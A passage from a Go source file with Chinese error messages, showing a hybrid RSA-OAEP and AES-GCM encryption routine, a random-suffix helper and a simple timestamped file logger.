				f, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err == nil {
					f.WriteString(resultEntry)
					f.Close()
				}
			}

			return
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func generateRandomSuffix() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return fmt.Sprintf("%x", b)
}

func hybridEncrypt(plaintext []byte, publicKeyStr string) ([]byte, error) {
	// 获取公钥（使用缓存）
	pubKey, err := getPublicKey(publicKeyStr)
	if err != nil {
		return nil, fmt.Errorf("获取公钥失败: %w", err)
	}

	aesKey := make([]byte, 32)
	if _, err := io.ReadFull(cryptoReader, aesKey); err != nil {
		return nil, fmt.Errorf("生成AES密钥失败: %w", err)
	}

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("创建AES cipher失败: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("创建GCM模式失败: %w", err)
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := io.ReadFull(cryptoReader, nonce); err != nil {
		return nil, fmt.Errorf("生成GCM nonce失败: %w", err)
	}

	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)

	encryptedAESKey, err := rsa.EncryptOAEP(sha256.New(), cryptoReader, pubKey, aesKey, nil)
	if err != nil {
		return nil, fmt.Errorf("RSA加密AES密钥失败: %w", err)
	}

	var buffer bytes.Buffer
	buffer.Write(encryptedAESKey)
	buffer.Write(nonce)
	buffer.Write(ciphertext)

	return buffer.Bytes(), nil
}

func newFileLog(filename string) (*fileLog, error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return nil, err
	}
	return &fileLog{file: f}, nil
}

func (l *fileLog) Log(message string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.file != nil {
		logLine := fmt.Sprintf("%s - %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
		_, _ = l.file.WriteString(logLine)
	}
}

func (l *fileLog) Close() error {
	if l.file != nil {
		return l.file.Close()
	}
	return nil
}
